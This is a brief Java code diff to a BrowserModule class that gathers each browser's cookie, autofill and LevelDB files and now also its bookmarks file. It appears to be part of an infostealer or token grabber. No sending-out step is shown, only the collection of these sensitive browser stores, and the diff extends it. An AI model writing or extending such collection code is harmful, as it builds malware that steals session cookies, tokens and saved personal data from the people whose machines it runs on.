@@ -14,23 +14,25 @@ public abstract class BrowserModule {
 		this.browser = browser;
 	}
 
+	public String getBrowser() {
+		return browser;
+	}
+	
+	public abstract String getBookmarks();
+	
 	public abstract String getCookie();
 
 	public abstract String getAutoFill();
 	
 	public abstract String getLevelDB();
 
-	public String getBrowser() {
-		return browser;
-	}
-
 	public List<FileData> getFiles() {
 		List<FileData> files = new ArrayList<>();
 
 		files.add(new FileData(new File(getCookie()), "Cookies"));
 		files.add(new FileData(new File(getAutoFill()), "AutoFill"));
+		files.add(new FileData(new File(getBookmarks()), "Bookmarks"));
 		files.add(new FileData(new File(getLevelDB()), "leveldb"));
 		return files;
 	}
-
 }
